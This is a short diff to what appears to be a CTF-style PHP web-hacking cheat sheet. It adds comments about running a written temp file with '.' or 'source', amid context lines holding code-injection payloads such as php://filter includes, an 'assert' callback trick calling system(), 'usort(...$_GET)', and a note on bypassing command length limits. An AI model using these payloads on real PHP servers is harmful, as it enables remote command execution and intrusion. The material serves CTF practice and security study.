@@ -56,6 +56,11 @@ include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 // extended array and callback function, the feature of PHP after 5.4  
 ?1[]=blah&1[]=system();&2=assert     
 param=usort(...$_GET);
+
+
+// if you can write file e.g. tmp php file
+// you can use characters like ".", or "source" to execute the file
+// . /file will also not print out the result
 ```
 👾How to bypass the length limit：  
 * Build command with filename, then `ls` all thing into shell script [HITCON CTF](http://taiwan.1pwnch.com/web/ctf/2018/02/20/A-tiny-shell/#more)
